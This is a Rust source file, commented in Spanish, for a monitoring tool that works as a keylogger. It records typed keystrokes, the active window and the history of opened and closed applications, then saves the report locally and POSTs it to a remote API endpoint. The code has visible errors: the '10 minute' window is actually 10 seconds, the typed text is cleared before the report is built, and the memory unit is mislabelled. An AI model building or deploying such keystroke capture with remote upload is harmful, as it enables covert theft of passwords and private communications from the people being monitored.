mod monitor;
mod input;
mod history;
mod active_app;

use chrono::prelude::*;
use sysinfo::System;
use std::thread;
use std::time::{Duration, Instant};
use std::fs::File;
use std::io::Write;
use serde_json::json;
use dotenv::dotenv;
use std::env;

#[tokio::main]
async fn main() {
    dotenv().ok();
    let api_url = env::var("API_URL").expect("API_URL must be set");

    let mut system = System::new_all();
    let start_time = Local::now();
    let mut history = history::History::new();
    let mut last_activity = Local::now();
    let mut typed_text = String::new();

    loop {
        // Capturar las teclas presionadas durante 10 minutos
        let monitor_start = Instant::now();
        while monitor_start.elapsed() < Duration::from_secs(10) { // 10 minutos
            let input_activity = input::get_input_activity(&mut last_activity);

            if !input_activity.keys_pressed.is_empty() {
                typed_text.push_str(&input_activity.typed_text);
            }

            // Para evitar un bucle apretado que consuma mucho CPU
            thread::sleep(Duration::from_millis(100));
        }

        let monitor_data = monitor::get_monitor_data(&mut system, &start_time);
        let active_window = active_app::get_active_window();

        println!("===============================");
        println!("      INFORME DE MONITOREO      ");
        println!("===============================");

        println!("\n>> Texto Escrito en los Últimos 10 Minutos:");
        if !typed_text.is_empty() {
            println!("{}", typed_text);
            typed_text.clear();
        } else {
            println!("Sin actividad en el teclado");
        }
        println!("-------------------------------");

        println!("\n>> Información del Sistema:");
        println!("Sistema encendido desde: {}", monitor_data.boot_time.format("%Y-%m-%d %H:%M:%S"));
        println!("Uso de CPU: {}%", monitor_data.cpu_usage);
        println!("Uso de Memoria: {:.2} GB", monitor_data.memory_usage as f64 / (1024.0 * 1024.0)); // Convertir a GB al imprimir
        println!("-------------------------------");

        println!("\n>> Aplicación Activa:");
        if let Some(ref active) = active_window {
            println!("{}", active);
        } else {
            println!("No se pudo determinar la aplicación activa.");
        }
        println!("-------------------------------");

        println!("\n>> Última Actividad:");
        println!("{}", last_activity.format("%Y-%m-%d %H:%M:%S"));
        println!("-------------------------------");

        println!("\n>> Historial de Aplicaciones Abiertas/Cerradas:");
        let current_apps: Vec<String> = monitor_data.applications.iter().map(|app| app.name.clone()).collect();
        history.update(&current_apps);
        for record in history.get_records() {
            println!("{} - {} ({})", record.time.format("%Y-%m-%d %H:%M:%S"), record.name, record.action);
        }
        println!("-------------------------------");

        println!("===============================\n");

        let report = generate_report(
            &typed_text,
            &monitor_data,
            active_window,
            &last_activity,
            &history,
        );

        save_report_to_file(&report, "monitor_report.json");
        send_report_to_api(&report, &api_url).await;

        // Esperar antes de iniciar el siguiente ciclo de 10 minutos
        thread::sleep(Duration::from_secs(1));
    }
}

fn generate_report(
    typed_text: &str,
    monitor_data: &monitor::MonitorData,
    active_window: Option<String>,
    last_activity: &DateTime<Local>,
    history: &history::History,
) -> serde_json::Value {
    json!({
        "text_written_last_10_minutes": typed_text,
        "system_info": {
            "boot_time": monitor_data.boot_time.format("%Y-%m-%d %H:%M:%S").to_string(),
            "cpu_usage": monitor_data.cpu_usage,
            "memory_usage_gb": monitor_data.memory_usage as f64 / (1024.0 * 1024.0),
        },
        "active_application": active_window.unwrap_or_else(|| "No se pudo determinar la aplicación activa.".to_string()),
        "last_activity": last_activity.format("%Y-%m-%d %H:%M:%S").to_string(),
        "application_history": history.get_records().iter().map(|record| {
            json!({
                "time": record.time.format("%Y-%m-%d %H:%M:%S").to_string(),
                "name": record.name,
                "action": record.action,
            })
        }).collect::<Vec<_>>(),
    })
}

fn save_report_to_file(report: &serde_json::Value, filename: &str) {
    let mut file = File::create(filename).expect("No se pudo crear el archivo");
    file.write_all(report.to_string().as_bytes())
        .expect("No se pudo escribir en el archivo");
}

async fn send_report_to_api(report: &serde_json::Value, api_url: &str) {
    let client = reqwest::Client::new();
    let res = client
        .post(api_url)
        .json(report)
        .send()
        .await;

    match res {
        Ok(response) => println!("Reporte enviado exitosamente: {:?}", response),
        Err(e) => eprintln!("Error al enviar el reporte: {:?}", e),
    }
}
